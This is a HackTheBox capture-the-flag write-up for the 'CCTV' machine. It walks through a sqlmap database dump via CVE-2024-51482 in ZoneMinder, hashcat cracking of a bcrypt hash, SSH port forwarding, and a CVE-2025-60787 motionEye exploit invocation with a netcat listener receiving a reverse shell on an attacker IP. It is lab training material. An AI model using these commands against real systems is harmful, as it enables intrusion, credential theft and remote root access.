# CCTV

**Platform:** HackTheBox
**OS:** Linux
**Tags:** CVE-2024-51482, SQL Injection, ZoneMinder, bcrypt, Hash Cracking, Port Forwarding, CVE-2025-60787, motionEye RCE, RCE, Privilege Escalation
**Date:** 2026-05-12

ZoneMinder exposed on port 80. CVE-2024-51482 SQL injection dumps the database including a bcrypt password hash, cracked with hashcat to get SSH access. An internal motionEye instance exposed via port forwarding is vulnerable to CVE-2025-60787, which delivers a root shell.

## 1. Enumeration

Started with a service scan.

```bash
nmap -sV -sC 10.129.53.160 -Pn
```

Findings:
- 22/tcp - OpenSSH 9.6p1 (Ubuntu)
- 80/tcp - Apache 2.4.58 - SecureVision CCTV & Security Solutions, staff login at root

Port 80 hosts a ZoneMinder installation branded as SecureVision. Added cctv.htb to /etc/hosts.

## 2. ZoneMinder SQLi (CVE-2024-51482)

CVE-2024-51482 is a SQL injection vulnerability in ZoneMinder's login endpoint. The username parameter is passed unsanitised into a database query, allowing blind or error-based extraction of data.

```bash
sqlmap -u "http://cctv.htb/zm/index.php" \
  --data="username=admin&password=admin&action=login" \
  --dbms=mysql --dump --batch
```

- password hash: bcrypt hash extracted from the users table

## 3. Hash Cracking

Cracked the bcrypt hash with hashcat mode 3200.

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

**Result:** Password cracked.

## 4. SSH Foothold

SSH'd in using the cracked credentials.

```bash
ssh <user>@10.129.53.160
```

**Result:** Shell obtained. User flag retrieved.

Checked for internal services listening on localhost.

```bash
ss -tlnp
```

- 127.0.0.1:8765 - motionEye - internal CCTV management panel

Forwarded the port to interact with it.

```bash
ssh -L 8765:127.0.0.1:8765 <user>@10.129.53.160
```

## 5. PrivEsc: motionEye RCE (CVE-2025-60787)

CVE-2025-60787 is an authenticated RCE in motionEye. With access to the internal panel, the vulnerability allows arbitrary command execution as root.

```bash
nc -lvnp 4444
```

```bash
python3 exploit_CVE-2025-60787.py \
  --url http://127.0.0.1:8765 \
  --lhost <ATTACKER_IP> \
  --lport 4444
```

**Result:** Root shell obtained.

## 6. Flags

- User: `redacted`
- Root: `redacted`
